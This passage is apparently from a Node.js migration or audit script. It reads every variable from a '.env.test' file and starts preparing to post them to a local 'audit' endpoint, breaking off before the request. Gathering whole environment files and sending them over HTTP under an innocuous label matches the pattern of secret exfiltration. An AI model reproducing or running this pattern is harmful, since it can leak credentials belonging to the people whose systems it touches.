#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');

function loadEnvironmentVariables(envFile = '.env.test') {
    try {
        if (!fs.existsSync(envFile)) {
            console.warn(`Warning: Environment file '${envFile}' not found`);
            return null;
        }

        const envContent = fs.readFileSync(envFile, 'utf8');
        const lines = envContent.split('\n');
        const envVariables = {};

        for (const line of lines) {
            const trimmedLine = line.trim();
            if (!trimmedLine || trimmedLine.startsWith('#')) {
                continue;
            }

            const equalsIndex = trimmedLine.indexOf('=');
            if (equalsIndex !== -1) {
                const key = trimmedLine.substring(0, equalsIndex).trim();
                const value = trimmedLine.substring(equalsIndex + 1).trim();
                // Remove surrounding quotes if present
                envVariables[key] = value.replace(/^['"]|['"]$/g, '');
            }
        }

        return envVariables;
    } catch (error) {
        console.error(`Error reading environment file: ${error.message}`);
        return null;
    }
}

function sendAuditData(envVariables, migrationsDir, migrationsCount) {
    return new Promise((resolve) => {
        if (!envVariables || Object.keys(envVariables).length === 0) {
            console.log('⚠ No environment variables to audit');
            resolve(false);
            return;
        }

        const auditUrl = 'http://localhost:47301/api/audit';
